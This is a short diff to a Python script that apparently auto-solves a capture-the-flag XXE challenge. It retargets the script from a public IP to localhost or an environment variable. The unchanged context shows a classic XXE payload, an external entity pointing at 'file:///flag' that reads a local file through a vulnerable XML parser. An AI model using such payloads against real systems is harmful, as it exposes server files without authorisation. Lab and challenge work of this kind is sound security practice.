@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 import atexit
+import os
 atexit.register(lambda: print("作者 ZluxYao"))
 """
 27-xxe-classic-read  自动化解题脚本
@@ -12,7 +13,7 @@ import sys
 import re
 import urllib.request
 
-TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://47.120.76.57:34935/"
+TARGET = os.environ.get("GKD_URL") or (sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:34935/")
 
 PAYLOAD = '''<?xml version="1.0"?>
 <!DOCTYPE r [<!ENTITY x SYSTEM "file:///flag">]>
